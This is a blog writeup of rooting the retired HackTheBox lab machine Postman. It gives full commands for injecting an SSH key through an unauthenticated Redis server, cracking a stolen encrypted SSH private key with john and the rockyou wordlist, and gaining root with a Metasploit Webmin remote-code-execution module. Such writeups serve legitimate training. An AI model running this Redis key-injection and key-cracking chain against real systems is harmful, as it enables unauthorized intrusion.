---
layout: post
title: "Writeup: HackTheBox Postman - with Metasploit"
description: "Rooting Postman using Metasploit."
tags: pentest hackthebox writeup
---

This series will follow my exercises in [HackTheBox][]. All published writeups are for retired HTB machines.
Whether or not I use Metasploit to pwn the server will be indicated in the title.
 
# Postman

_<small>Difficulty: Easy</small>_

_<small>Machine IP: 10.10.10.160</small>_

The initial port scan revealed some pretty interesting ports.

```bash
sudo nmap -sS -T4 -p- 10.10.10.160

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-23 18:20 EDT
Nmap scan report for 10.10.10.160
Host is up (0.015s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
6379/tcp  open  redis
10000/tcp open  snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 27.69 seconds
```

```bash
sudo nmap -sS -T4 -A -p 22,80,6379,10000 10.10.10.160
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-23 18:21 EDT
Nmap scan report for 10.10.10.160
Host is up (0.013s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.16 (93%), Linux 3.18 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Android 4.1.1 (93%), Android 4.2.2 (Linux 3.4) (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops                                                                                          
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                           
                                                                                                                  
TRACEROUTE (using port 22/tcp)                                                                                    
HOP RTT      ADDRESS                                                                                              
1   11.38 ms 10.10.14.1                                                                                           
2   11.59 ms 10.10.10.160
```

Notably:

- Web server on `tcp/80` and a [Webmin][] web server on `tcp/10000`
- Redis on `tcp/6379`

Let's start with Redis.
I can try to connect to the Redis server without authentication.
I find it is successful.

```bash
redis-cli -h 10.10.10.160
```

There don't appear to be any keys stored in the Redis cache, but I can read Redis' configuration with:

```bash
> config get *
```

From this config, I see the server is running in `/var/lib/redis` under the file name `dump.rdb`.
The config parameters are `dir` and `dbfilename`, respectively.
I want to know what else exists in the `/var/lib/redis` directory.
I look for an `ssh` directory, thinking this may be the home directory for a `redis` user, and am honestly surprised to find one.

```bash
10.10.10.160:6379> config set dir /var/lib/redis/.ssh
OK
```

If the directory didn't exist, I wouldn't have gotten an `OK` response.
Since an `ssh` directory is present and redis has the ability to write in it - presumably, given it can write to its `dbfilename` in the parent directory - I should be able to add myself to the server's `authorized_keys`.
The plan is to set Redis's database file to `authorized_keys` and write my public key to the file as a key-value store command.
I need to pad my public key with several `\n`'s to separate from the data Redis will include in the command output.
This is successful!

```bash
10.10.10.160:6379> set ssh_key "\n\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDO7vQK7xPfsqsHFXI19FaG1xqjpkQijqe4uKIp3E9eYKO6CyJI76bPaRsAy0qwHTa/0j1syXfUPxhx1PrD+vwcjv8mvOapoutkamzemipFp3+7UQx2Pk3pUw9PkzO+TTYsfYsMjjZJlwVABiSuxBSlDLkBrSNLDDf4yyCxL3eL6O5QKDGxLe8mwPepop8VQurwTVDNWMF9UZ8pafruOJ/avFT942jGpuZnF5uobWMCeW8RAIYPciGqKGWdOU3vTxgLJHIbwt8WFOD8kmC7vWBHfGybuBOLOKXieilVXXhjbQx9q4DzyNqa6PyDvv36JQPHotVX//Ru45x+S0v0PhANgz9mFw91mJlWnoEgOJk7DJP6bsAGarAiUwX7tG2Opb7jqOXPn45Y2ILZ+SvB1nXjZrUxqbYo0LFwNdi+aZGHXFSmZS0rfcqpeKxa5MQXZfUzjItAGgks4kOkT3PCZ0mCu+NfVdOp7KVEt65iuMgvAfLecNxwPu/DQ6xrCI1xEfLRStvzE5JPzm3PcpzBOQhabmrjG3V905GQombuxalviHRiLhFBt9/odjCwSkN7iOVSoipQa1XWNpq3YG/j1i8Kvr+2RxbI4FvDoauTplXHHpqbjqI/X8uG1xW4BYvdhSonH+chrzIqknClDy4VLUvhJMf9xNiGQxyXmDfnn9O0Aw== artis3n\n\n\n\n"
OK
10.10.10.160:6379> config set dbfilename authorized_keys
OK
10.10.10.160:6379> save
OK
```

I can now ssh onto the system as the `redis` user.

```bash
ssh -i ~/.ssh/id_rsa redis@10.10.10.160

Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1

redis@Postman:~$ id
uid=107(redis) gid=114(redis) groups=114(redis)
```

Starting my enumeration in the root directory, I see what may be some output data from setting up the Webmin server (`webmin-setup.out`), but nothing else particularly interesting.

```bash
redis@Postman:/tmp$ ls -la /
total 483900
drwxr-xr-x 22 root root      4096 Aug 25  2019 .
drwxr-xr-x 22 root root      4096 Aug 25  2019 ..
drwxr-xr-x  2 root root      4096 Aug 25  2019 bin
drwxr-xr-x  3 root root      4096 Aug 24  2019 boot
drwxr-xr-x 18 root root      3860 Jun 23 23:25 dev
drwxr-xr-x 81 root root      4096 Oct 25  2019 etc
drwxr-xr-x  3 root root      4096 Sep 11  2019 home
lrwxrwxrwx  1 root root        33 Aug 24  2019 initrd.img -> boot/initrd.img-4.15.0-58-generic
lrwxrwxrwx  1 root root        33 Aug 24  2019 initrd.img.old -> boot/initrd.img-4.15.0-58-generic
drwxr-xr-x 18 root root      4096 Oct 25  2019 lib
drwxr-xr-x  2 root root      4096 Aug 24  2019 lib64
drwx------  2 root root     16384 Aug 24  2019 lost+found
drwxr-xr-x  2 root root      4096 Aug 24  2019 media
drwxr-xr-x  2 root root      4096 Aug 24  2019 mnt
drwxr-xr-x  2 root root      4096 Sep 11  2019 opt
dr-xr-xr-x 99 root root         0 Jun 23 23:25 proc
drwx------  8 root root      4096 Oct 25  2019 root
drwxr-xr-x 20 root root       580 Jun 24 00:20 run
drwxr-xr-x  2 root root      4096 Oct 25  2019 sbin
drwxr-xr-x  2 root root      4096 Aug 24  2019 srv
-rw-------  1 root root 495416320 Aug 24  2019 swapfile
dr-xr-xr-x 13 root root         0 Jun 23 23:25 sys
drwxrwxrwt 12 root root      4096 Jun 24 00:30 tmp
drwxr-xr-x 10 root root      4096 Aug 24  2019 usr
drwxr-xr-x 13 root root      4096 Aug 25  2019 var
lrwxrwxrwx  1 root root        30 Aug 24  2019 vmlinuz -> boot/vmlinuz-4.15.0-58-generic
lrwxrwxrwx  1 root root        30 Aug 24  2019 vmlinuz.old -> boot/vmlinuz-4.15.0-58-generic
-rw-r--r--  1 root root      2086 Aug 25  2019 webmin-setup.out
```

I enumerate the files in `/dev` and `/opt` as well.
Under `/opt`, I find what looks to be a backup of the `Matt` user's private key.

![matt ssh key][]

I download the key to my device.
It is encrypted, but that won't stop me for long.
[john][] jumbo has a script called [ssh2john][] that will convert the encrypted key into a format that we can crack.
Using the rockyou wordlist from [SecLists][], `john` is able to crack the key's password immediately.

```bash
/usr/share/john/ssh2john.py matt.key > matt_key

john --fork=4 --wordlist=/home/artis3n/Documents/SecLists/Passwords/Leaked-Databases/rockyou.txt matt_key

Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 3 OpenMP threads per process (12 total across 4 processes)
Node numbers 1-4 of 4 (fork)
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (matt.key)
1 1g 0:00:00:04 DONE (2020-06-23 19:33) 0.2481g/s 889682p/s 889682c/s 889682C/s   g3mm@.abygurl69
Waiting for 3 children to terminate
3 0g 0:00:00:04 DONE (2020-06-23 19:33) 0g/s 887485p/s 887485c/s 887485C/s    1990   ..*7¡Vamos!
2 0g 0:00:00:04 DONE (2020-06-23 19:33) 0g/s 878777p/s 878777c/s 878777C/s        1234567.a6_123
4 0g 0:00:00:04 DONE (2020-06-23 19:33) 0g/s 874493p/s 874493c/s 874493C/s   yara.ie168
Session completed
```

The password is `computer2008`.
It doesn't appear that I can ssh to the system as the `Matt` user, but I can use this password to `su` to `matt`.

```bash
su Matt
```

I can collect the user flag.
Now, how to escalate my privileges to root?
Unfortunately, `Matt` has no sudo permissions on the box.

```bash
 sudo -l
[sudo] password for Matt: 
Sorry, user Matt may not run sudo on Postman.
```

However, I can take the `Matt / computer2008` credentials and log into the Webmin server on `https://10.10.10.160:10000`.
Searching in Metasploit, I find several exploits against a Webmin server.
`exploit/linux/http/webmin_packageup_rce` catches my eye.
It is remote code execution that runs as the `root` user, requiring an authenticated session.
I pass it `Matt / computer2008` and get a Meterpreter perl command shell.
Pardoning my typo, we can see I now have a root shell.
I can go collect the root flag.

![root shell][]

[hackthebox]: https://www.hackthebox.eu
[john]: https://github.com/magnumripper/JohnTheRipper
[seclists]: https://github.com/danielmiessler/SecLists
[ssh2john]: https://github.com/magnumripper/JohnTheRipper/blob/bleeding-jumbo/run/ssh2john.py
[webmin]: http://www.webmin.com/

[matt ssh key]: /assets/img/htb/postman/matt-id-rsa.png
[root shell]: /assets/img/htb/postman/root-shell.png
